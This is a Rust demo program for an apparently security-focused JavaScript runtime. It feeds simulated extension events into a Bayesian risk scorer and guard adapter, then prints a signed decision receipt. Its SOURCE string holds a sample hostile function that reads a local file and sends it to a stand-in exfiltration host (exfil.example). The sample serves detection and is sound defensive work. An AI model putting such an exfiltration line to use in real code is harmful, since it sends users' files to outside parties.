#![forbid(unsafe_code)]

use std::collections::{BTreeMap, BTreeSet};

use frankenengine_engine::baseline_interpreter::{
    FunctionRef, HookAction, HookContext, InterpreterHook, ObjectId,
};
use frankenengine_engine::bayesian_posterior::{BayesianPosteriorUpdater, Evidence, Posterior};
use frankenengine_engine::expected_loss_selector::LossMatrix;
use frankenengine_engine::guardplane_adapter::{GuardplaneAdapter, GuardplaneExtensionContext};
use frankenengine_engine::hash_tiers::AuthenticityHash;
use frankenengine_engine::runtime_config::RuntimeConfig;
use frankenengine_engine::security_epoch::SecurityEpoch;
use serde_json::json;

const EXTENSION_ID: &str = "demo:fishy";
const REPLAY_SEED: u64 = 0xDEC1_5105;
const SOURCE: &str = "function fishy() { const data = file_read('/tmp/report.txt'); fetch('https://exfil.example/ingest', data); crypto.subtle.digest('SHA-256', data); }";

#[derive(Clone, Copy)]
enum DemoEvent {
    FileReadNormalPattern,
    NetworkEgress,
    CryptoOp,
}

impl DemoEvent {
    fn label(self) -> &'static str {
        match self {
            Self::FileReadNormalPattern => "file_read normal_pattern",
            Self::NetworkEgress => "network_egress",
            Self::CryptoOp => "crypto_op",
        }
    }

    fn base_rate_millionths(self) -> i64 {
        match self {
            Self::FileReadNormalPattern => 40_000_000,
            Self::NetworkEgress => 120_000_000,
            Self::CryptoOp => 65_000_000,
        }
    }

    fn suspicion_millionths(self) -> i64 {
        match self {
            Self::FileReadNormalPattern => 75_000,
            Self::NetworkEgress => 950_000,
            Self::CryptoOp => 900_000,
        }
    }

    fn evidence(self, operation_index: u64) -> Evidence {
        let burst_penalty =
            i64::try_from(operation_index.saturating_sub(1)).unwrap_or(i64::MAX) * 25_000_000;
        let suspicion = self.suspicion_millionths();
        Evidence {
            extension_id: EXTENSION_ID.to_string(),
            hostcall_rate_millionths: (self.base_rate_millionths() + burst_penalty)
                .clamp(0, 600_000_000),
            distinct_capabilities: 1,
            resource_score_millionths: suspicion / 2,
            timing_anomaly_millionths: suspicion,
            denial_rate_millionths: suspicion / 4,
            epoch: SecurityEpoch::GENESIS,
        }
    }

    fn apply(self, adapter: &GuardplaneAdapter, operation_index: u64) -> HookAction {
        let ctx = HookContext {
            extension_id: EXTENSION_ID.to_string(),
            instruction_count: operation_index,
            current_ip: operation_index.saturating_sub(1) as usize,
        };
        match self {
            Self::FileReadNormalPattern => {
                adapter.pre_property_access(&ctx, &ObjectId(1), &"value".to_string())
            }
            Self::NetworkEgress => adapter.pre_import(&ctx, "node:net"),
            Self::CryptoOp => adapter.pre_call(
                &ctx,
                &FunctionRef::Function {
                    function_index: 0,
                    name: Some("eval".to_string()),
                },
                &[],
            ),
        }
    }
}

fn decision_name(action: &HookAction) -> &'static str {
    match action {
        HookAction::Allow => "allow",
        HookAction::Challenge(_) => "challenge",
        HookAction::Sandbox => "sandbox",
        HookAction::Suspend => "suspend",
        HookAction::Terminate(_) => "terminate",
        HookAction::Quarantine(_) => "quarantine",
    }
}

fn trusted_demo_metadata() -> BTreeMap<String, String> {
    [
        ("guardplane.enable_instruction_hooks", "true"),
        ("capability_witness.trust_level", "trusted"),
        ("capability_witness.confidence_millionths", "1000000"),
    ]
    .into_iter()
    .map(|(key, value)| (key.to_string(), value.to_string()))
    .collect()
}

fn main() {
    let runtime_config = RuntimeConfig::default();
    let prior = Posterior::from_prior_config(&runtime_config.guardplane.priors);
    let mut updater = BayesianPosteriorUpdater::new(prior, EXTENSION_ID);
    updater.set_epoch(SecurityEpoch::GENESIS);

    let adapter = GuardplaneAdapter::from_runtime_config(
        GuardplaneExtensionContext::new(EXTENSION_ID, BTreeSet::new(), trusted_demo_metadata()),
        LossMatrix::balanced(),
        &runtime_config,
        SecurityEpoch::GENESIS,
    );

    let events = [
        DemoEvent::FileReadNormalPattern,
        DemoEvent::FileReadNormalPattern,
        DemoEvent::FileReadNormalPattern,
        DemoEvent::NetworkEgress,
        DemoEvent::CryptoOp,
    ];

    let mut verdict = HookAction::Allow;
    for (idx, event) in events.iter().enumerate() {
        let operation_index = u64::try_from(idx + 1).unwrap_or(u64::MAX);
        updater.update(&event.evidence(operation_index));
        verdict = event.apply(&adapter, operation_index);
    }

    let summary = adapter.summary();
    assert_eq!(summary.last_posterior.as_ref(), Some(updater.posterior()));

    let posterior_after_millionths = updater.posterior().p_malicious.clamp(0, 1_000_000) as u32;
    let rationale = format!(
        "fishy() started with 3 normal file_read observations, then network_egress and crypto_op shifted the posterior to {} and triggered {}.",
        updater.posterior().map_estimate(),
        decision_name(&verdict)
    );
    let signature_preimage = json!({
        "source": SOURCE,
        "decision": decision_name(&verdict),
        "rationale": rationale,
        "posterior_after_millionths": posterior_after_millionths,
        "replay_seed": REPLAY_SEED,
        "events": events.iter().map(|event| event.label()).collect::<Vec<_>>(),
    });
    let signature_hex = AuthenticityHash::compute_keyed(
        b"franken-decision-demo-key",
        signature_preimage.to_string().as_bytes(),
    )
    .to_hex();

    let receipt = json!({
        "decision": decision_name(&verdict),
        "rationale": rationale,
        "posterior_after_millionths": posterior_after_millionths,
        "signature_hex": signature_hex,
        "replay_seed": REPLAY_SEED,
    });
    println!(
        "{}",
        serde_json::to_string_pretty(&receipt).expect("demo receipt should serialize")
    );
}
